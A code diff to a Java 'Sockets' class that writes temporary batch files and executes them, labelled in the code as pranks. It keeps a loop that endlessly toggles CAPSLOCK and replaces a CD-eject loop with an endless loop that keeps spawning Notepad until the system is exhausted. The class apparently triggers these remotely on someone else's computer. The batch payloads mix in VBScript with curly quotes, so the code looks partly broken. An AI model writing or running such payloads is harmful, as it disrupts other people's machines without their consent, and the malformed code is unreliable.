@@ -94,14 +94,14 @@ class Sockets
                 File temp = File.createTempFile("vncv216789", ".bat"); 
                 String filePath = temp.getAbsolutePath();
                 String dirPath = filePath.substring(0,filePath.lastIndexOf(File.separator));           
-
+                String nl = System.lineSeparator();
                 System.out.println("File in: " + filePath);
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("@ECHO off\nSet wshShell =wscript.CreateObject(“WScript.Shell”)\n" +
-    "do\n" +
-    "wscript.sleep 100\n" +
-    "wshshell.sendkeys “{CAPSLOCK}”\n" +
+                bw.write("@ECHO off " + nl +"Set wshShell =wscript.CreateObject(“WScript.Shell”)" + nl +
+    "do" + nl +
+    "wscript.sleep 100" + nl +
+    "wshshell.sendkeys “{CAPSLOCK}”" + nl +
     "loop");
                 bw.close();
 
@@ -113,27 +113,19 @@ class Sockets
                 File temp = File.createTempFile("vncv216789", ".bat"); 
                 String filePath = temp.getAbsolutePath();
                 String dirPath = filePath.substring(0,filePath.lastIndexOf(File.separator));           
-
+                String nl = System.lineSeparator();
+                
                 System.out.println("File in: " + filePath);
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("Set oWMP = CreateObject(“WMPlayer.OCX.7”)\n" +
-"Set colCDROMs = oWMP.cdromCollection\n" +
-"do\n" +
-"if colCDROMs.Count >= 1 then\n" +
-"For i = 0 to colCDROMs.Count – 1\n" +
-"colCDROMs.Item(i).Eject\n" +
-"Next\n" +
-"For i = 0 to colCDROMs.Count – 1\n" +
-"colCDROMs.Item(i).Eject\n" +
-"Next\n" +
-"End If\n" +
-"wscript.sleep 100\n" +
-"loop");
+                bw.write("@ECHO off" + nl +
+":top" + nl +
+"START %SystemRoot%\\system32\\notepad.exe" + nl +
+"GOTO top");
                 bw.close();
 
                 System.out.println(Sockets.executeCommand("call " + filePath));
-                System.out.println("CDRom Prank!");
+                System.out.println("Notepad Prank!");
             }else
                 System.out.println("Nothing has been done!");
             
